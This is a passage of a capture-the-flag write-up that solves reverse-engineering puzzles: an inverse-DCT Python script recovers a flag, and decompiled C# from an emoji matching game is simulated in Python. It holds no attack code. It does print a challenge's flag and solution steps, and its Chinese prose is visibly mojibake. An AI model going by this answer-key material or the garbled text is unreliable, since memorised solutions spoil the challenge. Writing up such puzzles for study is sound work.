class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v9; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::operator[](a2, j);</span><br><span class="line">      v6 = <span class="built_in">cos</span>((j + <span class="number">0.5</span>) * (<span class="number">3.141592653589793</span> * i) / v9) * v5;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::operator[](a1, i);</span><br><span class="line">      *v2 = *v2 + v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">      v7 = <span class="built_in">sqrt</span>(<span class="number">2.0</span> / v9);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v7 = <span class="built_in">sqrt</span>(<span class="number">1.0</span> / v9);</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::operator[](a1, i);</span><br><span class="line">    *v3 = *v3 * v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯†åˆ«ä»£ç é€»è¾‘ä¸ºç¦»æ•£ä½™å¼¦å˜æ¢(DCT)ç®—æ³•ï¼Œå†™ä¸€ä¸ªé€†ç®—æ³•è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;370.75 234.362 -58.0834 59.8212 88.8221 -30.2406 21.8316 49.9781 -33.5259 2.69675 43.5386 -30.2925 -28.0754 27.593 -2.53962 -27.1883 -5.60777 -0.263937 6.80326 8.03022 -6.34681 -0.89506 -6.80685 -13.6088 27.0958 29.8439 -21.7688 -20.6925 -13.2155 -37.0994 2.23679 37.6699 -3.5 9.85188 57.2806 13.5715 -20.7184 8.6816 3.59369 -4.5302 4.22203 -28.8166 -23.695 31.2268 6.58823 -39.9966 -20.7877 -19.7624 -22.031 16.3285 2.07557 -26.2521 16.1914 18.3976 -26.9295 3.03769 41.0412 20.2598 14.991 6.99392 -22.3752 -7.24466 8.96299 -10.4874&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">c = [<span class="built_in">float</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">idct</span>(<span class="params">signal</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Perform Inverse Discrete Cosine Transform (IDCT) on signal&quot;&quot;&quot;</span></span><br><span class="line">    n = <span class="built_in">len</span>(signal)</span><br><span class="line">    x = np.zeros(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">                y += signal[j] / np.sqrt(n)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y += signal[j] * np.sqrt(<span class="number">2</span>/n) * np.cos((np.pi*(<span class="number">2</span>*i+<span class="number">1</span>)*j)/(<span class="number">2</span>*n))</span><br><span class="line">        x[i] = y</span><br><span class="line">    <span class="keyword">return</span> np.<span class="built_in">round</span>(x).tolist()</span><br><span class="line"></span><br><span class="line">out = idct(c)</span><br><span class="line">out = [<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> out]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;9ab488a7-5b11-1b15-04f2-c230704ecf72&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Emoji-Connect"><a href="#Emoji-Connect" class="headerlink" title="Emoji Connect"></a>Emoji Connect</h3><blockquote><p>è¿è¿çœ‹</p></blockquote><p>ä½¿ç”¨ILSpyåˆ†æGameæ¨¡å—ï¼Œå†…å«48*48 emojiè¡¨æƒ…çŸ©é˜µï¼Œå…³é”®é€»è¾‘ï¼š</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">int</span>[] number = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">48</span>]</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">25588</span>, <span class="number">31114</span>, <span class="number">28727</span>, <span class="number">26722</span>, <span class="number">24948</span>, <span class="number">25135</span>, <span class="number">25480</span>, <span class="number">29029</span>, <span class="number">23025</span>, <span class="number">25775</span>,</span><br><span class="line">    <span class="number">15411</span>, <span class="number">25423</span>, <span class="number">25202</span>, <span class="number">30031</span>, <span class="number">27380</span>, <span class="number">30734</span>, <span class="number">25054</span>, <span class="number">25109</span>, <span class="number">20741</span>, <span class="number">28568</span>,</span><br><span class="line">    <span class="number">28802</span>, <span class="number">24591</span>, <span class="number">26063</span>, <span class="number">30940</span>, <span class="number">30375</span>, <span class="number">19411</span>, <span class="number">29573</span>, <span class="number">20845</span>, <span class="number">27232</span>, <span class="number">26743</span>,</span><br><span class="line">    <span class="number">25779</span>, <span class="number">24986</span>, <span class="number">31498</span>, <span class="number">30978</span>, <span class="number">22945</span>, <span class="number">26563</span>, <span class="number">35012</span>, <span class="number">29994</span>, <span class="number">27016</span>, <span class="number">29535</span>,</span><br><span class="line">    <span class="number">21342</span>, <span class="number">26573</span>, <span class="number">27569</span>, <span class="number">25408</span>, <span class="number">31567</span>, <span class="number">25503</span>, <span class="number">21385</span>, <span class="number">27207</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Select_Unit</span>(<span class="params">Range Target</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;Range&gt; list = <span class="keyword">new</span> List&lt;Range&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (Range cell <span class="keyword">in</span> Target.Cells)</span><br><span class="line">    &#123;</span><br><span class="line">        list.Add(cell);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((Target.Cells.Count == <span class="number">2</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) != <span class="literal">null</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing) != <span class="literal">null</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing) != <span class="string">&quot;\ud83d\udca5&quot;</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) != <span class="string">&quot;\ud83d\udca5&quot;</span>) &amp;&amp; (((<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) == (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing)) ? <span class="literal">true</span> : <span class="literal">false</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span>[] array = ((IEnumerable&lt;<span class="built_in">char</span>&gt;)(<span class="built_in">string</span>)(<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing)).Select((Func&lt;<span class="built_in">char</span>, <span class="built_in">int</span>&gt;)((<span class="built_in">char</span> c) =&gt; c)).ToArray();</span><br><span class="line">        <span class="built_in">int</span> num = (array[<span class="number">0</span>] - <span class="number">55296</span>) * <span class="number">1024</span> + array[<span class="number">1</span>] - <span class="number">56320</span> + <span class="number">65536</span> - <span class="number">128512</span>;</span><br><span class="line">        number[num] -= (list[<span class="number">1</span>].Row - <span class="number">1</span>) * (list[<span class="number">1</span>].Column - <span class="number">1</span>);</span><br><span class="line">        number[num] -= (list[<span class="number">0</span>].Row - <span class="number">1</span>) * (list[<span class="number">0</span>].Column - <span class="number">1</span>);</span><br><span class="line">        Range range = list[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">object</span> missing = Type.Missing;</span><br><span class="line">        <span class="built_in">object</span> obj;</span><br><span class="line">        list[<span class="number">1</span>].set_Value(Type.Missing, obj = <span class="string">&quot;\ud83d\udca5&quot;</span>);</span><br><span class="line">        range.set_Value(missing, obj);</span><br><span class="line">    &#125;</span><br><span class="line">    check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="built_in">dynamic</span>)sheet1.Cells[i + <span class="number">1</span>, j + <span class="number">1</span>]).Value != <span class="string">&quot;\ud83d\udca5&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MessageBox.Show(Encoding.ASCII.GetString(number.Select((<span class="built_in">int</span> n) =&gt; (<span class="built_in">byte</span>)n).ToArray()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯é€‰ä¸­ç›¸åŒçš„ä¸¤ä¸ªemojiï¼ŒæŒ‰ç…§emojiå¯¹åº”çš„arrayå€¼ï¼Œå°†numberæ•°ç»„é‡Œå¯¹åº”ä¸‹æ ‡çš„å€¼ï¼Œå‡å»é€‰ä¸­çš„ä¸¤ä¸ªemojiæ‰€åœ¨çš„è¡Œåˆ—å·ä¹‹ç§¯ã€‚</p><p>ä¸Šè„šæœ¬æ¨¡æ‹Ÿï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br></pre></td><td class="code"><pre><span class="line">s = [[</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span 